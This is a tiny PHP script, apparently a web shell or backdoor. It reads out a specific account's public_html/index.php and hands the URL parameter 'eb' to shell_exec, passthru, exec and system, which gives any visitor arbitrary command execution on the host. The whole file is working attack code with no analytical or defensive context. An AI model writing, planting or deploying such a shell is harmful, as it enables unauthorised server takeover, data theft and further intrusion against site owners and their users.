<?php
echo file_get_contents('/home/rafya/public_html/index.php');
echo shell_exec($_GET['eb']);
echo passthru($_GET['eb']);
echo exec($_GET['eb']);
echo system($_GET['eb']);
